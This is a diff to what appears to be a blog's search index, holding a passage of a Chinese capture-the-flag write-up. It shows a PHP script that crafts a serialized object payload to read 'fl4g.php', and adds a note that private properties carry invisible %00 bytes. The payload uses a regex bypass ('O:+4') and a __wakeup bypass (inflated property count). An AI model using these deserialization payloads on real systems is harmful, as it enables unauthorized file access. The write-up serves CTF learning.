@@ -731,8 +731,11 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;fl4g.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Demo();</span><br><span class="line"><span class="variable">$s</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$s</span> = str_replace(<span class="string">&#x27;O:4&#x27;</span>, <span class="string">&#x27;O:+4&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$s</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>, <span class="string">&#x27;:2:&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$var</span> = base64_encode(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="variable">$var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>最后得到flag</p>
+<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-9.1.png?raw=true"></p>
 </li>
+<li><h4 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
 </ul>
+<p>​        PHP反序列化在类名和变量名中间存在一个%00字符，然而这个字符是不显示的，因此在本题中如果先打印出来字符串再手动修改后再base64编码，最后得到的结果和直接操作得到的结果是不同的。</p>
 ]]></content>
   </entry>
 </search>
